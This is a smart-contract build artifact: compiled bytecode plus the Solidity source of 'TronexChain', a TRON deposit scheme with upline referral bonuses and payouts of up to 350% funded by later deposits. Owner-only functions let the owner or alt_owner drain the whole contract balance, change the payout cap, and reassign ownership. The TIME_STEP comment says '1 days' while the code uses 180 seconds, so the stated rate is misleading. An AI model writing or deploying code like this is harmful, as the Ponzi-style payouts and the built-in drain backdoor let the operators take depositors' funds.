91905055503073ffffffffffffffffffffffffffffffffffffffff16638959af3c600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b158015612b2f57600080fd5b505afa158015612b43573d6000803e3d6000fd5b505050506040513d6020811015612b5957600080fd5b8101908080519060200190929190505050600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015410151515612c23576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f4465706f73697420616c7265616479206578697374730000000000000000000081525060200191505060405180910390fd5b600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601548110158015612d3057506005600160058054905003600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000015411612d0b57600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000154612d15565b6001600580549050035b815481101515612d2157fe5b90600052602060002001548111155b1515612da4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b612e4c565b6305f5e1008110158015612dd7575060056000815481101515612dc857fe5b90600052602060002001548111155b1515612e4b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b5b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003018190555080600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601819055506000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007018190555042600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160006101000a81548164ffffffffff021916908364ffffffffff16021790555080600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060090160008282540192505081905550806008600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff167f2cb77763bc1e8490c1a904905c4d74b4269919aca114464f4bb4d911e60de364826040518082815260200191505060405180910390a26000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b6001600354038160ff1610156131ad57600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156130eb576131ad565b82600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c0160008282540192505081905550600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915080806001019150506130a1565b50600073ffffffffffffffffffffffffffffffffffffffff16600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415156133d857600a8281151561325257fe5b0460046000600460008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600401600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff16600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fba5b08f0cddc64825b52c35c09323af810c1d2e29c97aba01a4ed25cfdc482d1600a858115156133c157fe5b046040518082815260200191505060405180910390a35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc60328481151561341f57fe5b049081150290604051600060405180830381858888f1935050505015801561344b573d6000803e3d6000fd5b506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc60646003850281151561349657fe5b049081150290604051600060405180830381858888f193505050501580156134c2573d6000803e3d6000fd5b5050505056fea165627a7a72305820156f2eda8f5d331337590a0f8d910973e52b81df9c94c8bd510b528a9441023e0029",
  "source": "pragma solidity 0.5.4;\r\n\r\ncontract TronexChain {\r\n\r\n    struct User {\r\n        uint256 cycle;\r\n        address upline;\r\n        uint256 referrals;\r\n        uint256 payouts;\r\n        uint256 direct_bonus;\r\n        uint256 gen_bonus;\r\n        uint256 deposit_amount;\r\n        uint256 deposit_payouts;\r\n        uint40 deposit_time;\r\n        uint256 total_deposits;\r\n        uint256 total_payouts;\r\n        uint256 total_structure;\r\n\t\tuint256 team_biz ;\r\n    }\r\n\r\n    address payable public owner;\r\n    address payable public alt_owner;\r\n\tuint256 public max_receivable  = 0;\r\n\r\n    uint256 constant public CONTRACT_BALANCE_STEP = 10 trx; // 1000000 trx\r\n    uint256 constant public MIN_DEPOSIT = 50 trx; // 50 trx\r\n    uint256 constant public BASE_PERCENT = 120 ; // 0.1% => 1 unit, 1.2% daily (MULTIPLIER 100)\r\n\tuint256 constant public PERCENT_DIVIDER = 10000; \r\n    uint256 constant public TIME_STEP = 180 ; // 1 days\r\n \tuint256 public team_levels = 30;\r\n\r\n // for 10 mil - 0.2 % increase | 1 mil - 0.02 % \r\n // for 50 mil - 1 % total\r\n // for 50 mil and above, for every 10 mil - 0.1 %/\r\n\r\n    mapping(address => User) public users;\r\n\r\n    uint256[] public cycles;\r\n    uint8[] public ref_bonuses;                     // 1 => 1% \r\n\r\n    uint256 public total_users = 1;\r\n    uint256 public total_deposited;\r\n    uint256 public total_withdraw;\r\n    \r\n    event Upline(address indexed addr, address indexed upline);\r\n    event NewDeposit(address indexed addr, uint256 amount);\r\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n    event LimitReached(address indexed addr, uint256 amount);\r\n\r\n    constructor(address payable _owner, address payable _alt_owner) public {\r\n        owner = _owner;\r\n\t\talt_owner = _alt_owner;\r\n         \r\n        ref_bonuses.push(30);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5); \r\n \r\n        cycles.push(1e11);\r\n        cycles.push(3e11);\r\n        cycles.push(9e11);\r\n        cycles.push(2e12);\r\n    }\r\n \r\n    function _setUpline(address _addr, address _upline) private {\r\n        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && \r\n\t\t(users[_upline].deposit_time > 0 || _upline == owner)) {\r\n            users[_addr].upline = _upline;\r\n            users[_upline].referrals++;\r\n\r\n            emit Upline(_addr, _upline);\r\n\r\n            total_users++;\r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].total_structure++;\r\n\r\n                _upline = users[_upline].upline;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deposit(address _addr, uint256 _amount) private {\r\n        require(users[_addr].upline != address(0) || _addr == owner, \"No upline\");\r\n\r\n        if(users[_addr].deposit_time > 0) {\r\n            users[_addr].cycle++;\r\n            \r\n            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), \"Deposit already exists\");\r\n            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], \"Bad amount\");\r\n        }\r\n        else require(_amount >= 1e8 && _amount <= cycles[0], \"Bad amount\");\r\n        \r\n        users[_addr].payouts = 0;\r\n        users[_addr].deposit_amount = _amount;\r\n        users[_addr].deposit_payouts = 0;\r\n        users[_addr].deposit_time = uint40(block.timestamp);\r\n        users[_addr].total_deposits += _amount;\r\n\r\n        total_deposited += _amount;\r\n        \r\n        emit NewDeposit(_addr, _amount);\r\n\r\n\t\taddress _upline = users[_addr].upline;\r\n\r\n\t\t for(uint8 i = 0; i < team_levels - 1; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].team_biz += _amount;\r\n\r\n                _upline = users[_upline].upline;\r\n            }\r\n\r\n        if(users[_addr].upline != address(0)) {\r\n            users[users[_addr].upline].direct_bonus += _amount / 10;\r\n\r\n            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);\r\n        } \r\n         \r\n        owner.transfer(_amount / 50);\r\n        owner.transfer(_amount * 3 / 100);\r\n        \r\n    }\r\n     function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = users[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            if(users[up].referrals >= i + 1) {\r\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n                \r\n                users[up].gen_bonus += bonus;\r\n\r\n                emit MatchPayout(up, _addr, bonus);\r\n            }\r\n\r\n            up = users[up].upline;\r\n        }\r\n    }\r\n \r\n    function deposit(address _upline) payable external {\r\n        _setUpline(msg.sender, _upline);\r\n        _deposit(msg.sender, msg.value);\r\n    }\r\n\r\n    function withdraw() external {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\r\n        \r\n        require(users[msg.sender].payouts < max_payout, \"Full payouts\");\r\n\r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[msg.sender].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].deposit_payouts += to_payout;\r\n            users[msg.sender].payouts += to_payout;\r\n\r\n            _refPayout(msg.sender, to_payout);\r\n        }\r\n        \r\n        // Direct payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\r\n\r\n            if(users[msg.sender].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].direct_bonus -= direct_bonus;\r\n            users[msg.sender].payouts += direct_bonus;\r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[msg.sender].gen_bonus;\r\n\r\n            if(users[msg.sender].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].gen_bonus -= gen_bonus;\r\n            users[msg.sender].payouts += gen_bonus;\r\n            to_payout += gen_bonus;\r\n        }\r\n\r\n        require(to_payout > 0, \"Zero payout\");\r\n        \r\n        users[msg.sender].total_payouts += to_payout;\r\n        total_withdraw += to_payout;\r\n\r\n        msg.sender.transfer(to_payout);\r\n\r\n        emit Withdraw(msg.sender, to_payout);\r\n\r\n        if(users[msg.sender].payouts >= max_payout) {\r\n            emit LimitReached(msg.sender, users[msg.sender].payouts);\r\n        }\r\n    }\r\n    \r\n    function maxPayoutOf(uint256 _amount) external view returns(uint256) {\r\n\t\tif(max_receivable > 0){\r\n\t\t\treturn  _amount * max_receivable / 100;\r\n\t\t} else {\r\n        return \t_amount * 350 / 100; \r\n\t\t}\r\n    }\r\n \r\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {\r\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n\t\tuint256 total_rate = getTotalRate();\r\n\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENT_DIVIDER) - users[_addr].deposit_payouts;\r\n            \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n    }\r\n \r\n\tfunction getTotalRate() internal view returns(uint256) {\r\n\t \r\n\t\tuint256 contract_balance = address(this).balance;\r\n\t\tuint256 step1 = 0;\r\n\t\tuint256 step2 = 0;\r\n\t\tuint256 steps = contract_balance/CONTRACT_BALANCE_STEP ;\r\n\r\n\t\t if(steps <= 50){\r\n\t\t\t step1 = steps;\r\n\t\t\t step2 = 0; \r\n\t\t } else {\r\n\t\t\t step1 = 50;\r\n\t\t\t step2 = steps/2 - step1;\r\n\t\t }\r\n\t\t uint256 total_step = step1 + step2;\r\n \r\n\t\treturn BASE_PERCENT+total_step ;\r\n\t}\r\n\r\n\tfunction getContractBalance() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t} \r\n    /*\r\n        Only external call\r\n    */\r\n\r\n\tfunction changeMaxRec(uint256 _maxRecPercent) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\tmax_receivable = _maxRecPercent;\r\n\t} \r\n\r\n\tfunction withdrawFunds() public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner.transfer(address(this).balance);\r\n\t} \r\n\r\n\tfunction changeAdmin(address payable _newAdmin) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner = _newAdmin;\r\n\t} \r\n\r\n    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus) {\r\n        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus);\r\n    }\r\n\r\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 team_biz) {\r\n        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].team_biz);\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw ) {\r\n        return (total_users, total_deposited, total_withdraw );\r\n    }\r\n\r\n     \r\n}",
  "sourcePath": "C:/Users/RAAKESH/Desktop/Coding/TronDapp/ATRON RAMESH/contracts/TronexChain.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.4+commit.d15a3125.mod.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2020-10-22T06:51:02.849Z"
}